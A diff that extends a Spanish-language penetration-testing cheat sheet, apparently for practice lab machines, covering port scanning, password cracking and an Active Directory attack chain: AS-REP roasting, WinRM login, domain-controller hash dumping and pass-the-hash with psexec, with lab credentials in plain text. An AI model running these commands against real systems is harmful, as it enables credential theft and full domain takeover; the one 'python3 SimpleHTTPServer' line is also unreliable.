@@ -2,6 +2,7 @@
 
 ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.46 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 nmap -sC -sV -p$ports 10.10.10.46
+Masscan -p 1-65535 10.10.10.30 -e tun0 –rate=1000
 
 ***************************************************************Cracking password**
 
@@ -9,6 +10,7 @@ nmap -sC -sV -p$ports 10.10.10.46
   zip2john filezip
 2. Crack the hash
   john --pot=test.pot --wordlist=/usr/share/john/password.lst hash
+  john hash -wordlist=/usr/share/wordlists/rockyou.txt
   
 
 ************************************************************* comandos para después de obtener una shell**
@@ -34,4 +36,27 @@ gobuster dir -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt
 Windows wmic OS get OSArchitecture
 windows systeminfo | findstr /I type
 Linux uname -r
+
+************************************************************Servidor HTTP Temporal *************************************
+
+python3 -m SimpleHTTPServer 80
+
+************************************************************Firewall rules******************************************
+iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+
+***********************************************************directorio activo****************************************
+pip install bloodhound
+bloodhound-python -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c all -n 10.10.10.30
+
+Extracción de un hash del TGT Ticket
+GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30 > hash
+
+Conectarse al servidor por medio de WinRm
+evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19
+
+Dump Hashes DC
+secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
+
+conectarse al servidor con hashe
+psexec.py megacorp.local/administrator@10.10.10.30 -hashes <NTML hash>:<NTLM hash>
 
